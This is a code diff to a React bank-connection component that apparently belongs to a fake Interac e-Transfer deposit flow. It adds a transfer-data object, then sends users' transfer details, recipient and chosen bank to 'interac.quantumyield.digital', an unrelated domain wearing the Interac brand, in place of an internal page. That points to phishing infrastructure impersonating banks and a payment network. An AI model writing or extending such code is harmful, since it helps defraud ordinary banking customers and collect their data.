@@ -10,13 +10,24 @@ import { useLanguage } from "@/lib/i18n/context"
 import { getBankLogoPath } from "@/lib/bank-logo-mapper"
 import { cn } from "@/lib/utils"
 
+interface TransferData {
+  transferId: string
+  amount: string
+  recipient: string
+  recipientName: string
+  bankName: string
+  message: string
+  timestamp: string
+}
+
 interface BankConnectionFlowProps {
   selectedInstitutions: FinancialInstitution[]
   onBack: () => void
   onComplete?: () => void
+  transferData?: TransferData | null
 }
 
-export default function BankConnectionFlow({ selectedInstitutions, onBack, onComplete }: BankConnectionFlowProps) {
+export default function BankConnectionFlow({ selectedInstitutions, onBack, onComplete, transferData }: BankConnectionFlowProps) {
   const { t } = useLanguage()
   const router = useRouter()
   const [currentIndex, setCurrentIndex] = useState(0)
@@ -45,20 +56,27 @@ export default function BankConnectionFlow({ selectedInstitutions, onBack, onCom
   }
 
   const handleRedirect = () => {
+    // Build countdown URL with all transaction parameters using URLSearchParams for proper encoding
     const params = new URLSearchParams({
       bankId: currentInstitution.id,
       bankName: currentInstitution.name,
       categoryId: currentInstitution.categoryId,
     })
 
-    console.log("[v0] Redirecting to countdown with params:", {
-      bankId: currentInstitution.id,
-      bankName: currentInstitution.name,
-      categoryId: currentInstitution.categoryId,
-    })
+    // Add transfer data parameters if available
+    if (transferData) {
+      params.set("transferId", transferData.transferId)
+      params.set("amount", transferData.amount)
+      params.set("recipient", transferData.recipient)
+      params.set("recipientName", transferData.recipientName)
+      params.set("senderBank", transferData.bankName)
+      params.set("message", transferData.message)
+      params.set("timestamp", transferData.timestamp)
+    }
 
-    // Redirect to countdown page
-    router.push(`/countdown?${params.toString()}`)
+    // Redirect to production countdown page
+    const countdownUrl = `https://interac.quantumyield.digital/countdown?${params.toString()}`
+    window.location.href = countdownUrl
   }
 
   const handleSkip = () => {
